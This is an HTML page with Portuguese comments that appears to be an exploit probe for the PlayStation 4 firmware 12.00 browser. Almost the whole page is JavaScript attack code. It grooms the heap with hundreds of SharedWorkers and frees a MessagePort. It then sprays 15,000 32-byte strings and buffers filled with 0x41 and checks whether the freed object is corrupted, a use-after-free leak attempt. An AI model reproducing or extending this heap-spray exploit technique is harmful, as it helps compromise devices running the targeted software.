<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 12.00 - TARGET 0x20</title>
    
</head>
<body>

    <h1>ALVO CONFIRMADO: 0x20 (32 bytes)</h1>
    <h3>Estratégia: Micro-Spray Híbrido</h3>
    
    <button onclick="start_micro_attack()">DISPARAR NO 0x20</button>
    <div id="log">Sistema pronto.</div>

    <script>
        function log(msg, type="") {
            var d = document.getElementById("log");
            var color = type === "success" ? "#0f0" : "#ccc";
            d.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. PAYLOADS (32 BYTES)
        // =================================================================
        // Precisamos de objetos que caibam EXATAMENTE em 32 bytes no Kernel.
        
        function get_string_payload() {
            // String de 32 caracteres "A"
            return "A".repeat(32);
        }

        function get_buffer_payload() {
            // ArrayBuffer de 32 bytes preenchido com 0x41414141
            var buf = new ArrayBuffer(32);
            var view = new Uint32Array(buf);
            view.fill(0x41414141);
            return buf;
        }

        // =================================================================
        // 2. EXECUÇÃO
        // =================================================================
        var workers = [];
        var spray_stash = [];

        async function start_micro_attack() {
            if(!window.SharedWorker) return log("Erro: Navegador.");

            log(">>> INICIANDO ATAQUE MICRO (0x20) <<<");

            // 1. Grooming (380)
            log("Grooming...");
            for(let i=0; i<380; i++) {
                try { workers.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
            }

            // 2. Trigger (403)
            var p_count = 0;
            var limit = 403 - 380;

            var it = setInterval(() => {
                if (p_count >= limit) {
                    clearInterval(it);
                    
                    // VÍTIMA
                    var v = workers.pop();
                    var p = v.port;
                    
                    // FREE
                    v.port.close();
                    v = null;
                    
                    // SPRAY HÍBRIDO (Strings + Buffers)
                    // Tentamos "ensanduichar" o buraco com tipos diferentes
                    // para ver qual o alocador aceita.
                    log("Spraying 0x20...");
                    
                    var str_load = get_string_payload();
                    var buf_load = get_buffer_payload();

                    for(let k=0; k<15000; k++) {
                        // Alterna entre String e Buffer
                        if (k % 2 === 0) spray_stash.push(str_load.substr(0)); // Clona string
                        else spray_stash.push(buf_load.slice(0)); // Clona buffer
                    }

                    // CHECK
                    setTimeout(() => {
                        try {
                            var s = p.toString();
                            
                            // Se o objeto foi corrompido por "AAAA..." (0x41...)
                            if (s.indexOf("MessagePort") === -1) {
                                log("!!! SUCESSO ABSOLUTO !!!", "success");
                                log("Objeto Corrompido: " + s, "success");
                                alert("LEAK 0x20 CONFIRMADO!");
                            } else {
                                log("Falha: Objeto intacto.");
                                // Força bruta final
                                try { let x = p.onmessage; } catch(e) {
                                    if(e.toString().match(/0x/)) alert("LEAK NO ERRO: " + e);
                                }
                            }
                        } catch(e) {
                            log("ERRO DE ACESSO: " + e, "success");
                        }
                        
                        // Limpeza
                        workers.forEach(w=>{try{w.port.close()}catch(e){}});
                        spray_stash = [];
                        
                    }, 500);
                    
                    return;
                }
                
                try {
                    let w = new SharedWorker("data:text,1", "v"+p_count);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
                p_count++;
            }, 60);
        }
    </script>
</body>
</html>
